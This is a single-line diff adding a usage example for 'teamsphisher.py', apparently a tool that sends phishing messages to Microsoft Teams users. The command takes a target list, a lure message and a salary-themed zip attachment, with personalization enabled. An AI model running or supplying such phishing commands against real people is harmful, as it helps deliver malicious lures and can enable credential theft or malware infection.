@@ -1,0 +1,1 @@
+teamsphisher.py -u admin@example.com -p password -l ./targets.txt -a ./salaryinfo.zip -m ./message.txt --log --personalize
